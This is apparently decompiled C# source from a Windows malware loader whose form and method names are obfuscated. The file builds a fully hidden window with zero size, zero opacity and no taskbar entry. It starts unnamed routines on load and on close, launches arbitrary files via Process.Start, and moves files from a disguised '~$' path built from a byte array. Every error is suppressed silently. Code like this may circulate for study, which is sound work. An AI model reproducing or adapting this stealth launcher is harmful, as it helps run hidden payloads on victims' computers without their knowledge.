using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace dtiardhues;

public class Form1 : Form
{
	private MLREDM dtiardhuesmainvp = new MLREDM();

	private IContainer components = null;

	public void load_file(string fileName)
	{
		try
		{
			Process.Start(fileName);
		}
		catch
		{
		}
	}

	public void dtiardhuesloadMe()
	{
		try
		{
			if (DLAONIF.dtiardhuesget_mpath() != Path.GetDirectoryName(Application.get_ExecutablePath()) + "\\")
			{
			}
		}
		catch
		{
		}
	}

	private void dtiardhuesloadOthr(string tFile, string fileName)
	{
		try
		{
			byte[] array = new byte[2] { 126, 36 };
			string @string = Encoding.UTF8.GetString(array, 0, array.Length);
			if (File.Exists(@string + tFile))
			{
				File.Move(@string + tFile, fileName);
			}
		}
		catch
		{
		}
	}

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			((Form)this).set_ShowIcon(false);
			((Control)this).set_Visible(false);
			((Form)this).set_FormBorderStyle((FormBorderStyle)6);
			dtiardhuesmainvp.dtiardhuesdo_start();
			dtiardhuesloadMe();
		}
		catch
		{
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		Thread.Sleep(15);
		dtiardhuesmainvp.dtiardhuesload_app();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
